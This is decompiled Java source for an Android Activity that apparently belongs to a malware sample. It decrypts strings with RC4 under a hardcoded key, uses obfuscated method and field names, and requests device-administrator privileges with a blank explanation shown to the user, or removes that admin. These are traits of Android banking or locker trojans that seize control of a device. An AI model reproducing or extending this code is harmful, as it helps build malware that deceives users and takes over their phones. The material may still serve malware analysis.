/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.admin.DevicePolicyManager
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Bundle
 *  android.os.Parcelable
 *  android.util.Base64
 */
package com.example.mmm.Admin;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcelable;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Admin.ClassAdmin;
import com.example.mmm.Admin.ReceiverDeviceAdmin;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

public class ActivityAdmin
extends Activity {
    constants consts = new constants();
    utils utl = new utils();

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    protected void onCreate(Bundle object) {
        super.onCreate(object);
        object = new ClassAdmin((Context)this);
        if (this.getIntent().getStringExtra("admin").equals("1")) {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", (Parcelable)object.locking$);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "");
            this.startActivityForResult(intent, 100);
        } else {
            object = new ComponentName((Context)this, ReceiverDeviceAdmin.class);
            ((DevicePolicyManager)this.getSystemService("device_policy")).removeActiveAdmin((ComponentName)object);
        }
        this.finish();
    }
}

